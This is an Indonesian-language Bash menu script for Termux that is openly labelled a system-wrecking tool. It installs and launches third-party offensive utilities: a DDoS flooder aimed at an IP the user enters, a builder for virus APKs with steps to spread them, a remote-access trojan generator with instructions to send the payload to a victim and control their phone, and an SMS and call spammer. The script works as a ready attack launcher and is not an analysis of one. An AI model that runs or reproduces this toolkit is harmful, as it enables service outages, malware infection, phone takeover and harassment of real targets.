#usr/bin/bash
clear
# Recode ajh mmnx
echo
echo
#ini paket untuk menjalankan tools
mr.xbots.sh
echo
clear
sleep 1
echo "==========================================="
sleep 1
echo  "|AUTHOR   : MR.XBOTS                     |"
sleep 1
echo  "|WA       : 08814679274                  |"
sleep 1
echo  "|IG.      : Pandark00                    |"
sleep 1
echo  "|TOOLS    : pengrusak sistem             |"
sleep 1
echo "==========================================="
sleep 1
echo
sleep 1 
echo  "====================="
echo  "[ 1 ] DDOS HAMMER"
echo  "[ 2 ] VBUG"
echo  "[ 3 ] A-Rat"
echo  "[ 4 ] Spam"
echo  "[ 5 ] Exit"
echo  "====================="
read -p "=====> " pil; 

if [ $pil = 1 ]
then
clear
pkg install python
clear
echo "========================================"
sleep 1
echo  "|AUTHOR   : MR.XBOTS                  |"
sleep 1
echo  "|WA       : 08814679274               |"
sleep 1
echo  "|IG.      : Pandark00                 |"
sleep 1
echo  "|TOOLS    : DDOS HAMMER               |"
sleep 1
echo "========================================"
echo
echo
echo
echo "YAKIN INGIN MELANJUTKAN Y"
read -p "~~~~~~ " dd; 
fi

if [ $dd = y ]
then
clear
echo
echo "========================================"
sleep 1
echo  "|AUTHOR   : MR.XBOTS                  |"
sleep 1
echo  "|WA       : 08814679274               |"
sleep 1
echo  "|IG.      : Pandark00                 |"
sleep 1
echo  "|TOOLS    : DDOS HAMMER               |"
sleep 1
echo "========================================"
echo
echo
echo
echo
echo "#######################"
echo "[ 1 ] DDOS SEKARANG"
echo "[ 2 ] DAPATKAN IP WEB"
echo "#######################"
echo
echo
echo "KETIK PILIHAN"
read -p ">>>>>>>>> " os; 
fi


if [ $os = 1 ]
then
clear
echo "========================================"
sleep 1
echo  "|AUTHOR   : MR.XBOTS                  |"
sleep 1
echo  "|WA       : 08814679274               |"
sleep 1
echo  "|IG.      : Pandark00                 |"
sleep 1
echo  "|TOOLS    : DDOS HAMMER               |"
sleep 1
echo "========================================"
echo
echo
echo
echo
read -p "MASUKAN IP TARGET >>>>>> " korban;
git clone https://github.com/cyweb/hammer
cd hammer
python hammer.py -s $korban -p 80 -t 135
fi

if [ $os = 2 ]
then
clear
echo "=========================================="
sleep 1
echo  "|AUTHOR   : MR.XBOTS                    |"
sleep 1  
echo  "|WA       : 08814679274                 |"
sleep 1
echo  "|IG.      : Pandark00                   |"
sleep 1
echo  "|TOOLS    : DAPATKAN IP WEB             |"
sleep 1
echo "=========================================="
echo
echo
echo
echo "MASUKAN NAMA WEB CONTOH GOOGLE.com"
read -p ">>>>>>>> " wb; 
ping $wb
echo
echo "KETIK Y UNTUK DDOS KETIK N UNTUK STOP"
read -p ">>>>>>>> " ln; 
fi


if [ $ln = y ]
then
clear
echo "========================================"
sleep 1
echo  "|AUTHOR   : MR.XBOTS                  |"
sleep 1
echo  "|WA       : 08814679274               |"
sleep 1
echo  "|IG.      : Pandark00                 |"
sleep 1
echo  "|TOOLS    : DDOS HAMMER               |"
sleep 1
echo "========================================"
echo
echo
echo
echo
read -p "MASUKAN IP TARGET >>>>>> " korban;
git clone https://github.com/cyweb/hammer
cd hammer
python hammer.py -s $korban -p 80 -t 135
fi

if [ $ln = n ]
then
clear 
figlet -f slant "E X I T"|lolcat
sleep 0.3
exit
fi


if [ $pil = 2 ]
then
clear
echo "========================================"
sleep 1
echo  "|AUTHOR   : MR.XBOTS                  |"
sleep 1
echo  "|WA       : 08814679274               |"
sleep 1
echo  "|IG.      : Pandark00                 |"
sleep 1
echo  "|TOOLS    : VBUG                      |"
sleep 1
echo "========================================"
echo
echo
echo "==============================="
echo "[ 1 ] BUAT APK VIRUS"
echo "[ 2 ] pindahkan virus ke sdcard"
echo "[ 3 ] EXIT"
echo "==============================="
read -p "}}}}}} " no; 
fi

if [ $no = 1 ]
then
clear
figlet -f slant "INSTAL KEPERLUAN"|lolcat
pkg install python2
git clone https://github.com/Junior60/vbug.git
cd vbug
python2 vbug.py
fi

if [ $no = 2 ]
then
clear
echo "============================================"
sleep 1
echo  "|AUTHOR   : MR.XBOTS                      |"
sleep 1
echo  "|WA       : 08814679274                   |"
sleep 1
echo  "|IG.      : Pandark00                     |"
sleep 1
echo  "|TOOLS    : CEK VIRUS                     |"
sleep 1
echo "============================================"
echo
echo
echo
echo
sleep 0.3
echo "================================="
sleep 0.3
echo " [ 1 ] Buka sdcard"
sleep 0.3
echo " [ 2 ] Cari folder vbug"
sleep 0.3
echo " [ 3 ] Buka foldef vbug"
sleep 0.3
echo " [ 4 ] Buka folder virus"
sleep 0.3
echo " [ 5 ] Cari virus berbentuk apk"
sleep 0.3
echo " [ 6 ] Sebarkan"
sleep 0.3
echo "================================="
cd vbug
cd virus
ls
fi

if [ $no = 3 ]
then
figlet -f slant "E X I T"|lolcat
sleep 0.5
exit
fi


if [ $pil = 3 ]
then
clear
echo  "============================================"
sleep 1
echo  "|AUTHOR   : MR.XBOTS                      |"
sleep 1
echo  "|WA       : 08814679274                   |"
sleep 1
echo  "|IG.      : Pandark00                     |"
sleep 1
echo  "|TOOLS    : A-Rat                         |"
sleep 1
echo  "============================================"
echo
echo
echo
echo "============================================================================"
echo "[ 1 ] saat sudah masuk ke A-Rat ketik"
echo "[ 2 ] set PORT 1337"
echo "[ 3 ] set HOST 127.0.0.1"
echo "[ 4 ] set OUTPUT /sdcard/nama sc yang kalian inginkan.py"
echo "[ 5 ] generate"
echo "[ 6 ] untuk mengaktifkan nya ketik"
echo "[ 7 ] set PORT 1337"
echo "[ 8 ] set HOST 127.0.0.1"
echo "[ 9 ] run"
echo "[ 10 ] cari sc di sdcard lalu kirim ke target"
echo "[ 11 ] jika target sudah menggunakan sc nya"
echo "[ 12 ] kita bisa kendalikan hp nya untuk mengetahui fungsinya apa saja ketik"
echo "[ 13 ] help"
echo "[ 14 ] E N J O Y"
echo "============================================================================"
echo
echo 
echo
echo "Y untuk melanjutkan"
read -p ">>>>>> " nomber; 
fi


if [ $nomber = y ]
then
clear
figlet -f slant "INSTAL KEPERLUAN"|lolcat
pkg install python2
git clone https://github.com/Xi4u7/A-Rat.git
cd A-Rat
python2 A-Rat.py
fi


if [ $pil = 5 ]
then
figlet -f slant "E X I T"|lolcat
sleep 0.5
exit
fi

if [ $pil = 4 ]
then
clear
echo "===================================================="
sleep 1
echo  "|AUTHOR   : MR.XBOTS                              |"
sleep 1
echo  "|WA       : 08814679274                           |"
sleep 1
echo  "|IG.      : Pandark00                             |"
sleep 1
echo  "|TOOLS    : Troll_project                         |"
sleep 1
echo "===================================================="
echo
echo
echo
echo
echo "==================================================="
echo "[ 1 ] Ketik Y jika ingin melanjutkan"
echo "[ 2 ] Jika sudah masuk ke troll_project masukan nama anda"
echo "[ 3 ] Ketik Y"
echo "[ 4 ] Pilih salah satu pilihan spam tlp/sms"
echo "[ 5 ] Masukan nomber target"
echo "[ 6 ] Masukan jumlah jika menggunakan spam sms"
echo "[ 7 ] ENJOY"
echo "==================================================="
echo
echo
echo
echo "ketik Y untuk melanjutkan"
read -p ">>>>>> " yn; 
fi

if [ $yn = y ]
then
clear
figlet -f slant "INSTALL KEPERLUAN"|lolcat
pkg install curl
git clone https://github.com/zlucifer/troll_project.git
cd troll_project
bash troll.sh
fi





